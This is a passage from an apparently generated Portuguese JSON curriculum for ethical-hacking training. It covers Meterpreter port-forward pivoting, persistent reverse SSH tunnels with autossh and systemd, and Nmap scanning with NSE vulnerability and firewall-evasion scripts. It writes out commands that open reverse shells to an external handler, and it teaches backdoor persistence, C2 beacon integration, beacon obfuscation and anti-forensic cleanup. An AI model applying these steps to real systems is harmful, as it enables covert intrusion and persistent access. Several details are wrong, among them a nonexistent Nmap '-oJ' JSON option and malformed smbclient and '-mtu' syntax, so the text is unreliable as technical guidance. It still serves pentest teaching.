                                    "Meterpreter session",
                                    "netcat (nc)",
                                    "Internal host services running (ex: SMB on 445)"
                                  ],
                                  "tips": "Escolha portas locais livres e evite conflitos com serviços existentes.",
                                  "learningObjective": "Configurar encaminhamento de portas para bypass de segmentação de rede.",
                                  "commonMistakes": [
                                    "Sintaxe errada no portfwd",
                                    "Porta remota fechada no host interno",
                                    "Esquecer de especificar IP correto"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Hosts Internos e Verificar Persistência C2",
                                  "subSteps": [
                                    "Acesse serviço interno via forward: ex: smbclient //127.0.0.1/<local_port>.",
                                    "Inicie nova sessão Meterpreter no host interno via forwarded port.",
                                    "Instale backdoor/persistência no interno (ex: autorun via schtasks).",
                                    "Teste C2 bidirecional: comandos do atacante fluem via pivot para interno.",
                                    "Documente caminho persistente e remova forwards ao final."
                                  ],
                                  "verification": "Acesso bem-sucedido ao interno e comandos C2 executam sem interrupção.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas SMB/Nmap via forward",
                                    "Payloads adicionais"
                                  ],
                                  "tips": "Use 'autoroute' para rotas automáticas após portfwd.",
                                  "learningObjective": "Aplicar pivoting para persistência C2 em redes profundas.",
                                  "commonMistakes": [
                                    "Não testar bidirecionalidade",
                                    "Sobrecarga de rede causando timeouts",
                                    "Falha em limpar artefatos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest de rede corporativa, comprometa um desktop Windows (pivot) na DMZ via phishing. Use portfwd para tunelar RDP (3389) de um servidor SQL interno (10.0.1.50) para sua máquina: 'portfwd add -l 13389 -p 3389 -r 10.0.1.50'. Conecte via RDP localhost:13389, extraia dados e implante beacon C2 persistente.",
                              "finalVerifications": [
                                "Port forwards listados e ativos sem erros.",
                                "Acesso bidirecional confirmado para múltiplos hosts internos.",
                                "Persistência C2 testada com reconexão após reboot simulado.",
                                "Nenhum alerta de IDS/IPS disparado no lab.",
                                "Logs documentados com timestamps e comandos exatos.",
                                "Ambiente resetado via snapshots."
                              ],
                              "assessmentCriteria": [
                                "Configuração portfwd sem erros de sintaxe ou binding.",
                                "Sucesso em acessar pelo menos 2 serviços internos via forward.",
                                "Demonstração de persistência C2 com uptime >5min.",
                                "Identificação e mitigação de 3+ erros comuns durante o processo.",
                                "Diagrama claro da topologia antes/depois do pivoting.",
                                "Limpeza completa sem vestígios no lab."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de NAT, firewalls e roteamento.",
                                "Sistemas Operacionais: Gerenciamento de portas e processos em Windows/Linux.",
                                "Programação: Scripts em Ruby para automação Metasploit.",
                                "Análise de Malware: Técnicas de tunelamento em beacons.",
                                "Ética em Cibersegurança: Regras de engagement em red teaming."
                              ],
                              "realWorldApplication": "Em operações de Red Team, pivoting com portfwd permite bypass de air-gaps lógicos em ICS/SCADA, acesso a segmentos OT isolados e estabelecimento de C2 em defesas EDR avançadas, como visto em campanhas APT contra infraestruturas críticas."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.3",
                            "name": "Manter Pivô com Tunelamento SSH",
                            "description": "Criar túneis SSH persistentes de hosts comprometidos para encadear acessos e manter comunicação C2 em ambientes com firewalls restritivos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Comprometer o Host Pivô",
                                  "subSteps": [
                                    "Identifique um host comprometido em rede restrita com acesso SSH outbound permitido.",
                                    "Instale ferramentas necessárias como OpenSSH no host pivô via payload inicial.",
                                    "Configure chaves SSH para autenticação sem senha entre pivô e operador externo.",
                                    "Teste conectividade básica SSH do pivô para o handler externo.",
                                    "Documente IPs, portas e credenciais para referência."
                                  ],
                                  "verification": "Execute 'ssh -i key user@external_ip' do pivô e confirme login bem-sucedido sem prompts de senha.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "VMs para lab (Kali Linux externo, Ubuntu pivô), chaves SSH geradas (ssh-keygen), acesso shell inicial no pivô.",
                                  "tips": "Use chaves ed25519 para performance; evite senhas em produção.",
                                  "learningObjective": "Compreender pré-requisitos de rede e autenticação para túneis SSH seguros.",
                                  "commonMistakes": "Esquecer de adicionar chave pública ao authorized_keys; bloquear por firewall outbound."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabelecer Túnel SSH Reverso Inicial",
                                  "subSteps": [
                                    "No pivô, execute comando SSH reverso: 'ssh -R 2222:localhost:22 -i key user@external_handler -N -f'.",
                                    "No handler externo, teste acesso forward: 'ssh -p 2222 localuser@localhost'.",
                                    "Expanda o túnel para múltiplas portas: -R 8080:internal_target:80 -R 4444:localhost:4444.",
                                    "Monitore logs SSH em ambos os lados para depuração.",
                                    "Ajuste opções como -o ServerAliveInterval=60 para manter vivo."
                                  ],
                                  "verification": "Do handler externo, acesse shell interno via túnel e liste arquivos remotos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Cliente SSH configurado, netcat para testes de porta, logs /var/log/auth.log.",
                                  "tips": "Use -N para não executar shell remoto; -f para background.",
                                  "learningObjective": "Dominar sintaxe de túneis SSH reversos para bypass de firewalls.",
                                  "commonMistakes": "Portas forward conflitantes; não usar -o ExitOnForwardFailure=yes para falhas explícitas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Persistência com AutoSSH",
                                  "subSteps": [
                                    "Instale autossh no pivô: 'apt install autossh'.",
                                    "Crie script wrapper: autossh -M 0 -R 2222:localhost:22 -i key user@external -N -f.",
                                    "Configure como serviço systemd: crie /etc/systemd/system/ssh-tunnel.service com [Service] Restart=always.",
                                    "Habilite e inicie: systemctl enable --now ssh-tunnel.service.",
                                    "Teste persistência reiniciando o pivô e verificando túnel ativo."
                                  ],
                                  "verification": "Após reboot do pivô, 'netstat -tlnp | grep 2222' no handler mostra conexão ativa.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Autossh instalado, editor de texto (nano/vim), conhecimento básico systemd.",
                                  "tips": "Use -M 0 para monitoramento via stdout; defina Environment= para variáveis sensíveis.",
                                  "learningObjective": "Implementar automação para túneis SSH resilientes a falhas e reboots.",
                                  "commonMistakes": "Serviço falhar por permissões; não monitorar journalctl -u ssh-tunnel para erros."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar com C2 e Testar Encadeamento de Acessos",
                                  "subSteps": [
                                    "Configure listener C2 no handler para porta tunelada (ex: Covenant ou Empire em 4444).",
                                    "Do pivô, inicie beacon C2 apontando para localhost:4444 via túnel.",
                                    "Encadeie pivôs: use túnel para acessar host mais profundo e repetir processo.",
                                    "Teste comandos C2 através do túnel: shell, downloads, lateral movement.",
                                    "Monitore tráfego com Wireshark para stealth."
                                  ],
                                  "verification": "Execute comandos C2 remotos via túnel e confirme execução em host interno restrito.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Framework C2 (Metasploit/Covenant), Wireshark, rede lab multi-tier.",
                                  "tips": "Mantenha payloads small para túneis low-bandwidth; use obfuscation em beacons.",
                                  "learningObjective": "Conectar túneis SSH a infra C2 para persistência em redes segmentadas.",
                                  "commonMistakes": "C2 beacon não resolver localhost corretamente; vazamento de tráfego não-tunelado."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar, Gerenciar e Limpar Túnel",
                                  "subSteps": [
                                    "Configure alertas para downtime: script cron checando nc -z external 2222.",
                                    "Use tmux/screen no pivô para sessões persistentes de monitoramento.",
                                    "Implemente kill switch: sinal para parar túnel remotamente.",
                                    "Registre logs de atividade para análise pós-op.",
                                    "Limpe artefatos: rm chaves, serviços, history shell."
                                  ],
                                  "verification": "Simule falha, confirme auto-restart e cleanup manual sem traços.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Cron, tmux, scripts bash personalizados.",
                                  "tips": "Logs em RAM disk (/dev/shm) para anti-forense.",
                                  "learningObjective": "Garantir OPSEC em operações de pivô SSH persistente.",
                                  "commonMistakes": "Deixar serviços rodando pós-teste; logs persistentes detectáveis."
                                }
                              ],
                              "practicalExample": "Em um lab com VM interna (10.0.1.10) atrás de firewall e Kali externa (192.168.1.100), comprometa a VM interna via phishing. No interno, rode 'autossh -M 0 -R 2222:localhost:22 operator@192.168.1.100 -f'. Do Kali, ssh -p 2222 root@localhost acessa shell interno. Integre Empire C2 na porta 4444 tunelada para comandos persistentes mesmo após reboot.",
                              "finalVerifications": [
                                "Túnel SSH permanece ativo após reboot do pivô (netstat confirma).",
                                "Acesso shell e C2 funcionam através do túnel sem interrupções por 1 hora.",
                                "Encadeamento permite pivotar para 2+ hosts internos.",
                                "Nenhum tráfego C2 vaza fora do túnel (Wireshark check).",
                                "Serviço systemd gerencia restart automático em falhas de rede.",
                                "Cleanup remove todos artefatos detectáveis."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta de túnel reverso com autenticação key-based (100% funcional).",
                                "Persistência demonstrada com autossh/systemd (sobrevive reboot e falhas).",
                                "Integração C2 seamless com comandos executados remotamente.",
                                "OPSEC: sem logs persistentes ou tráfego detectável.",
                                "Troubleshooting eficaz de erros comuns (logs analisados).",
                                "Documentação completa de comandos e verificações."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de NAT, firewalls e port forwarding.",
                                "Administração Linux: Systemd, SSH config, scripting bash.",
                                "Criptografia: Chaves SSH, monitoramento de integridade.",
                                "Cibersegurança Defensiva: Detecção de túneis anômalos via EDR.",
                                "Programação: Automação com Python para monitoramento de túneis."
                              ],
                              "realWorldApplication": "Em operações Red Team, pentests corporativos ou CTFs avançados, túneis SSH persistentes permitem bypass de firewalls egress para manter C2 em redes air-gapped ou segmentadas, simulando APTs como Cobalt Strike beacons em infra crítica."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.6",
                "name": "Ferramentas de Ethical Hacking, Pivoting e Persistência",
                "description": "Apresenta ferramentas para hacking ético, técnicas de pivoting entre sistemas e métodos de persistência no alvo.",
                "totalSkills": 45,
                "atomicTopics": [
                  {
                    "id": "10.1.6.1",
                    "name": "Ferramentas Essenciais de Ethical Hacking",
                    "description": "Apresentação de ferramentas como Nmap, Metasploit e Wireshark para reconnaissance, scanning e exploração ética.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.1.1",
                        "name": "Nmap",
                        "description": "Ferramenta essencial para reconnaissance e scanning de rede, permitindo descoberta de hosts, serviços, versões e vulnerabilidades de forma ética.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.1.1",
                            "name": "Instalação e Configuração Inicial do Nmap",
                            "description": "Instalar o Nmap em ambientes Linux/Windows e configurar opções básicas como saída em diferentes formatos (XML, JSON) para integração com outras ferramentas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparação do Ambiente e Verificação de Pré-requisitos",
                                  "subSteps": [
                                    "Escolha o ambiente operacional: Linux (ex: Ubuntu) ou Windows 10/11.",
                                    "Verifique a conectividade à internet para downloads.",
                                    "Atualize o sistema: No Linux, execute 'sudo apt update && sudo apt upgrade'; no Windows, verifique atualizações via Configurações.",
                                    "Crie um diretório de trabalho dedicado, como ~/nmap-lab no Linux ou C:\\nmap-lab no Windows.",
                                    "Instale dependências básicas: No Linux, 'sudo apt install build-essential'; no Windows, instale Git e um terminal como PowerShell."
                                  ],
                                  "verification": "Sistema atualizado sem erros e diretório criado (use 'ls' ou 'dir').",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Acesso root/administrador",
                                    "Conexão à internet",
                                    "Terminal/PowerShell"
                                  ],
                                  "tips": "Use uma VM para testes isolados e evite sistemas de produção.",
                                  "learningObjective": "Identificar e preparar o ambiente para instalação segura do Nmap.",
                                  "commonMistakes": [
                                    "Ignorar atualizações de segurança",
                                    "Executar sem privilégios elevados",
                                    "Usar rede corporativa restrita"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalação do Nmap em Linux e Windows",
                                  "subSteps": [
                                    "No Linux (Ubuntu/Debian): Execute 'sudo apt install nmap'.",
                                    "No Linux alternativo: Baixe do site oficial (nmap.org) e compile com './configure && make && sudo make install'.",
                                    "No Windows: Baixe o instalador .exe do nmap.org/download e execute como administrador.",
                                    "No Windows alternativo: Use Chocolatey ('choco install nmap') ou winget ('winget install Insecure.Nmap').",
                                    "Confirme instalação executando 'nmap --version' em ambos os ambientes."
                                  ],
                                  "verification": "Comando 'nmap --version' retorna versão atual (ex: 7.94) sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Instalador Nmap oficial",
                                    "Gerenciador de pacotes (apt/choco/winget)"
                                  ],
                                  "tips": "Prefira repositórios oficiais para evitar malwares; verifique hash SHA256.",
                                  "learningObjective": "Realizar instalação cross-platform do Nmap de forma eficiente.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais",
                                    "Esquecer privilégios sudo/admin",
                                    "Não verificar versão pós-instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificação Inicial e Teste Básico",
                                  "subSteps": [
                                    "Execute um scan simples: 'nmap -v localhost' ou 'nmap -v 127.0.0.1'.",
                                    "Teste opções básicas: 'nmap --help' para listar comandos.",
                                    "Verifique portas abertas locais com 'nmap -p 1-1000 localhost'.",
                                    "Salve saída normal: 'nmap localhost > scan.txt'.",
                                    "Compare saída com documentação oficial para validar."
                                  ],
                                  "verification": "Scan completa sem crashes e identifica portas esperadas (ex: 22 SSH se ativo).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Host local para teste"
                                  ],
                                  "tips": "Use -v para verbose e identifique seu próprio IP com 'ip addr' ou 'ipconfig'.",
                                  "learningObjective": "Validar funcionalidade básica do Nmap pós-instalação.",
                                  "commonMistakes": [
                                    "Scan em redes não autorizadas",
                                    "Ignorar firewall local bloqueando",
                                    "Não usar verbose para debug"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configuração de Saídas em XML e JSON",
                                  "subSteps": [
                                    "Teste saída XML: 'nmap -oX scan.xml localhost'.",
                                    "Teste saída JSON (Nmap 7.90+): 'nmap --output-format json -oJ scan.json localhost'.",
                                    "Valide XML com 'xmllint --noout scan.xml' (instale libxml2-utils no Linux).",
                                    "No Windows, use PowerShell para validar JSON: 'Get-Content scan.json | ConvertFrom-Json'.",
                                    "Integre teste: Pipe para grep 'grep \"portid\" scan.xml' ou jq para JSON."
                                  ],
                                  "verification": "Arquivos XML/JSON gerados e parseáveis sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Nmap com suporte NSE",
                                    "xmllint/jq (opcional)"
                                  ],
                                  "tips": "Use -oA para todas as saídas; aprenda jq para manipular JSON.",
                                  "learningObjective": "Configurar e validar formatos de saída para automação.",
                                  "commonMistakes": [
                                    "Versão Nmap sem JSON nativo",
                                    "Caminhos com espaços no Windows",
                                    "Não validar parseabilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integração Básica e Limpeza",
                                  "subSteps": [
                                    "Script simples: Crie batch/shell para scan + saída XML/JSON.",
                                    "Teste integração: Importe XML em ferramenta como Zenmap ou Dradis.",
                                    "Limpe arquivos: 'rm *.xml *.json' ou del no Windows.",
                                    "Documente configuração em README.md.",
                                    "Backup de configs personalizadas em ~/.nmap ou %APPDATA%/nmap."
                                  ],
                                  "verification": "Script executa e gera saídas integráveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Ferramenta parseadora opcional"
                                  ],
                                  "tips": "Automatize com cron/task scheduler para scans recorrentes.",
                                  "learningObjective": "Aplicar configurações em workflows reais.",
                                  "commonMistakes": [
                                    "Não limpar dados sensíveis",
                                    "Scripts sem error handling",
                                    "Ignorar permissões de arquivo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Ubuntu, instale Nmap via apt, execute 'nmap -oX relatorio.xml -oJ relatorio.json scanme.nmap.org', valide com xmllint e jq, e integre o XML em um relatório HTML simples usando xsltproc.",
                              "finalVerifications": [
                                "Nmap instalado e versão exibida corretamente em Linux e Windows.",
                                "Scans básicos completam sem erros em localhost.",
                                "Saídas XML e JSON geradas e validadas como parseáveis.",
                                "Opções -oX e -oJ funcionam com targets remotos autorizados.",
                                "Nenhum erro de privilégios ou dependências pendentes.",
                                "Documentação local de comandos criados."
                              ],
                              "assessmentCriteria": [
                                "Instalação bem-sucedida em ambos OS sem intervenção manual extra (90% automação).",
                                "Saídas em XML/JSON 100% válidas e legíveis por ferramentas padrão.",
                                "Tempo total dentro de 1.5h com verificações.",
                                "Ausência de erros comuns como falhas de permissão.",
                                "Script de teste funcional e reutilizável.",
                                "Compreensão demonstrada via explicação de formatos de saída."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entender portas e serviços escaneados.",
                                "Programação: Parse de XML/JSON com Python (xml.etree, json module).",
                                "Segurança: Integração com SIEM ou ferramentas como Metasploit.",
                                "Sistemas Operacionais: Gerenciamento de pacotes cross-platform.",
                                "Dados: Análise de outputs estruturados para relatórios."
                              ],
                              "realWorldApplication": "Em operações de ethical hacking, configure Nmap para gerar relatórios XML/JSON em pentests, permitindo importação automática em plataformas como Nessus, Burp Suite ou dashboards customizados para equipes de Red Team monitorarem vulnerabilidades em tempo real."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.1.2",
                            "name": "Execução de Scans Básicos",
                            "description": "Realizar scans de hosts vivos (ping scan), scans de portas TCP/UDP e interpretação de resultados para identificar dispositivos ativos na rede.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial do Nmap",
                                  "subSteps": [
                                    "Baixe e instale o Nmap a partir do site oficial (nmap.org) compatível com seu SO (Windows, Linux ou macOS).",
                                    "Verifique a instalação executando 'nmap --version' no terminal ou prompt de comando.",
                                    "Configure o firewall para permitir o tráfego de scan (desative temporariamente para testes locais).",
                                    "Explore opções básicas com 'nmap --help' e identifique comandos essenciais como -sn, -sS, -sU.",
                                    "Crie um diretório de trabalho para salvar outputs de scans."
                                  ],
                                  "verification": "Comando 'nmap --version' retorna versão atual sem erros e 'nmap --help' exibe ajuda completa.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Computador com acesso à internet",
                                    "Terminal/Prompt de Comando",
                                    "Site oficial do Nmap"
                                  ],
                                  "tips": "Use uma VM (VirtualBox/VMware) para testes isolados e evite scans em redes não autorizadas.",
                                  "learningObjective": "Configurar ambiente pronto para execução de scans Nmap sem falhas técnicas iniciais.",
                                  "commonMistakes": [
                                    "Instalar versão errada para o SO",
                                    "Esquecer de permitir tráfego no firewall",
                                    "Executar como usuário sem privilégios root/admin"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Execução de Ping Scan para Hosts Vivos",
                                  "subSteps": [
                                    "Identifique o range de IP alvo (ex: rede local 192.168.1.0/24).",
                                    "Execute 'nmap -sn 192.168.1.0/24' para discovery de hosts vivos via ICMP.",
                                    "Salve output em arquivo: 'nmap -sn 192.168.1.0/24 -oN ping_scan.txt'.",
                                    "Analise hosts listados como 'up' e anote MAC addresses se disponíveis.",
                                    "Teste em um host específico: 'nmap -sn 192.168.1.1'."
                                  ],
                                  "verification": "Output lista pelo menos 1 host 'up' com hostname ou MAC, salvo em arquivo legível.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Acesso a rede local ou VM com múltiplos hosts",
                                    "Editor de texto para outputs"
                                  ],
                                  "tips": "Use -sn para evitar port scans desnecessários; combine com -T4 para velocidade.",
                                  "learningObjective": "Detectar hosts ativos na rede usando ping scan sem sobrecarregar a rede.",
                                  "commonMistakes": [
                                    "Usar range inválido",
                                    "Ignorar firewalls que bloqueiam ICMP",
                                    "Não salvar output para análise posterior"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Execução de Scan de Portas TCP",
                                  "subSteps": [
                                    "Selecione host alvo de hosts vivos (ex: 192.168.1.1).",
                                    "Execute SYN scan stealth: 'nmap -sS -p- 192.168.1.1'.",
                                    "Scan portas comuns: 'nmap -sS -F 192.168.1.1'.",
                                    "Adicione service detection: 'nmap -sS -sV 192.168.1.1'.",
                                    "Salve em XML para ferramentas: 'nmap -sS -sV -oX tcp_scan.xml 192.168.1.1'."
                                  ],
                                  "verification": "Output mostra portas open/closed/filtered com versions de services detectadas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Host alvo ativo",
                                    "Privilégios admin/root para SYN scan",
                                    "Ferramenta como Zenmap para visualização opcional"
                                  ],
                                  "tips": "Use -sS para stealth; evite -sT em produção para não completar handshakes.",
                                  "learningObjective": "Mapear portas TCP abertas e services rodando em hosts alvo.",
                                  "commonMistakes": [
                                    "Executar sem root (usa connect scan lento)",
                                    "Scan full -p- em rede grande sem timing ajustado",
                                    "Ignorar version detection (-sV)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Execução de Scan de Portas UDP",
                                  "subSteps": [
                                    "Execute scan UDP básico: 'nmap -sU 192.168.1.1'.",
                                    "Combine TCP+UDP: 'nmap -sS -sU -T4 192.168.1.1'.",
                                    "Scan portas top UDP: 'nmap -sU --top-ports 20 192.168.1.1'.",
                                    "Lide com respostas lentas: 'nmap -sU --top-ports 20 -T3 192.168.1.1'.",
                                    "Salve output: 'nmap -sU -sV -oN udp_scan.txt 192.168.1.1'."
                                  ],
                                  "verification": "Output identifica portas UDP open|closed|open|filtered, mesmo com timeouts esperados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Mesmo host alvo",
                                    "Paciência para scans lentos UDP"
                                  ],
                                  "tips": "UDP é lento devido a 'open|filtered'; use --top-ports para eficiência.",
                                  "learningObjective": "Detectar services UDP ativos apesar de desafios inerentes ao protocolo.",
                                  "commonMistakes": [
                                    "Não ajustar timing (-T3/-T4)",
                                    "Scan UDP full sem necessidade",
                                    "Confundir open|filtered"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Interpretação e Análise de Resultados",
                                  "subSteps": [
                                    "Revise outputs: identifique hosts up, portas open, services/versions.",
                                    "Use Zenmap ou 'nmap -oX scan.xml && xsltproc scan.xml nmap.xml.xsl > report.html'.",
                                    "Correlacione: ex. porta 80 open = web server Apache 2.4.7.",
                                    "Documente achados em relatório: hosts, portas, riscos potenciais.",
                                    "Valide com tools como netstat ou browser para portas open."
                                  ],
                                  "verification": "Relatório resume hosts ativos, top portas/services e insights acionáveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Arquivos de output salvos",
                                    "Zenmap ou browser para XML reports"
                                  ],
                                  "tips": "Sempre priorize portas open com services conhecidos para priorização.",
                                  "learningObjective": "Transformar dados brutos de scan em inteligência de rede acionável.",
                                  "commonMistakes": [
                                    "Ignorar filtered ports",
                                    "Não validar versions",
                                    "Sobrecarregar com dados sem análise"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM com Kali Linux e Metasploitable: execute 'nmap -sn 192.168.56.0/24' para achar Metasploitable (192.168.56.102 up), então 'nmap -sS -sU -sV -T4 192.168.56.102' revelando portas como 21/FTP open, 23/Telnet open, interpretando como alvos vulneráveis para exploração.",
                              "finalVerifications": [
                                "Pode listar hosts vivos em rede local com ping scan sem erros.",
                                "Executa scans TCP/UDP SYN completos com service detection em <5min por host.",
                                "Interpreta output identificando pelo menos 80% das portas/services corretamente.",
                                "Gera relatório HTML/XML de scans multiplos.",
                                "Diferencia open/closed/filtered em TCP e UDP.",
                                "Ajusta comandos para timing e stealth baseado em contexto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de hosts e portas (90% match com validação manual).",
                                "Eficiência: scans completos sem timeouts excessivos ou sobrecarga de rede.",
                                "Análise qualitativa: identifica services e riscos potenciais corretamente.",
                                "Documentação: outputs salvos e relatório claro/estruturado.",
                                "Conformidade legal: só scans em ambientes controlados/autorizados.",
                                "Adaptabilidade: ajusta comandos para cenários variados (UDP lento, firewalls)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entendimento de protocolos ICMP, TCP three-way handshake, UDP.",
                                "Programação: Scripts Nmap com Python (python-nmap) para automação.",
                                "Sistemas Operacionais: Privilégios root/admin e configurações de firewall (iptables/ufw).",
                                "Análise de Dados: Processamento de outputs XML/JSON para visualização.",
                                "Ética e Direito: Leis de cibersegurança (LGPD, autorização para scans)."
                              ],
                              "realWorldApplication": "Em pentests éticos (ex: Red Team), Nmap scans iniciais mapeiam infraestrutura alvo, identificando entry points como RDP exposto (3389/TCP) para pivoting, ou DNS UDP (53) para poisoning, permitindo priorizar vulnerabilidades em relatórios de segurança para CISOs."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.1.3",
                            "name": "Scans Avançados e Detecção de Vulnerabilidades",
                            "description": "Aplicar scripts NSE (Nmap Scripting Engine) para detecção de serviços, versões e vulnerabilidades comuns, como evasão de firewalls.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configuração e Entendimento do Nmap Scripting Engine (NSE)",
                                  "subSteps": [
                                    "Instale o Nmap com suporte a NSE em um ambiente Linux como Kali.",
                                    "Explore a estrutura de diretórios do NSE: /usr/share/nmap/scripts/.",
                                    "Atualize o banco de scripts com 'nmap --script-updatedb'.",
                                    "Leia a documentação oficial do NSE para entender categorias de scripts (discovery, vuln, etc.).",
                                    "Teste um script simples como 'http-title' em um host local."
                                  ],
                                  "verification": "Execute 'nmap --script-help http-title' e liste 5 categorias de scripts disponíveis.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Nmap instalado (versão 7+)",
                                    "Kali Linux ou VM equivalente",
                                    "Documentação NSE online"
                                  ],
                                  "tips": "Sempre use '--script-updatedb' antes de scans para scripts atualizados.",
                                  "learningObjective": "Compreender a arquitetura e instalação do NSE para uso em scans avançados.",
                                  "commonMistakes": [
                                    "Não atualizar scripts, levando a falsos negativos.",
                                    "Ignorar dependências de scripts (requires)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Execução de Scripts NSE para Detecção de Serviços e Versões",
                                  "subSteps": [
                                    "Use 'nmap -sV --script version' para detectar versões de serviços.",
                                    "Aplique scripts de discovery: 'nmap -sC target' para scripts default.",
                                    "Execute scripts específicos: 'nmap --script banner,http-methods target'.",
                                    "Analise saídas com '--script-args' para customizações.",
                                    "Salve resultados em XML para análise posterior com 'nmap -oX'."
                                  ],
                                  "verification": "Identifique versão exata de um serviço como Apache em um target de teste.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Máquina alvo vulnerável (ex: Metasploitable)",
                                    "Nmap",
                                    "Editor de texto para análise"
                                  ],
                                  "tips": "Combine -sV com scripts para maior precisão; use -v para verbose.",
                                  "learningObjective": "Aplicar NSE para mapear serviços e versões com precisão.",
                                  "commonMistakes": [
                                    "Esquecer -sV, resultando em detecções genéricas.",
                                    "Sobrecarregar com muitos scripts, aumentando tempo de scan."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detecção de Vulnerabilidades Comuns com Scripts NSE",
                                  "subSteps": [
                                    "Execute scripts de vulnerabilidades: 'nmap --script vuln target'.",
                                    "Teste scripts específicos como 'smb-vuln-ms17-010' para EternalBlue.",
                                    "Use 'nmap --script smb-enum*,vuln target' para serviços Windows.",
                                    "Interprete saídas: identifique CVEs reportados e severidade.",
                                    "Valide falsos positivos manualmente com ferramentas complementares."
                                  ],
                                  "verification": "Detecte e liste pelo menos 3 vulnerabilidades em um target como DVWA.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Target com vulns conhecidas (DVWA ou Metasploitable)",
                                    "Nmap NSE scripts de vuln"
                                  ],
                                  "tips": "Filtre por categoria: '--script 'vuln,exploit'' para foco.",
                                  "learningObjective": "Usar NSE para identificar vulnerabilidades exploráveis automaticamente.",
                                  "commonMistakes": [
                                    "Confiar cegamente em resultados sem validação.",
                                    "Ignorar scripts que requerem autenticação."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Técnicas de Evasão de Firewalls e IDS com NSE",
                                  "subSteps": [
                                    "Aplique evasão básica: 'nmap -f --script firewall-bypass target'.",
                                    "Use fragmentação e MTU: 'nmap -f -mtu 8 target'.",
                                    "Scripts NSE para evasão: 'nmap --script http-firewall-bypass target'.",
                                    "Combine com timing: 'nmap -T2 --script discovery target'.",
                                    "Teste em ambiente controlado com pfSense ou Snort."
                                  ],
                                  "verification": "Realize scan bem-sucedido em target atrás de firewall simples.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Firewall/IDS VM (ex: pfSense)",
                                    "Target protegido",
                                    "Nmap"
                                  ],
                                  "tips": "Ajuste --max-parallelism para scans stealth.",
                                  "learningObjective": "Evasão de defesas para scans em ambientes reais.",
                                  "commonMistakes": [
                                    "Usar timing agressivo (-T5) que alerta IDS.",
                                    "Não testar incrementalmente evasões."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório, execute 'nmap -sV --script vuln,smb-vuln* -p445 metasploitable.local' para detectar EternalBlue (MS17-010) em serviço SMB, analisando saída para CVE e risco.",
                              "finalVerifications": [
                                "Lista e explica 10 scripts NSE de vuln e discovery.",
                                "Executa scan NSE completo identificando serviços, versões e 2+ vulns.",
                                "Aplica evasão de firewall com sucesso em target protegido.",
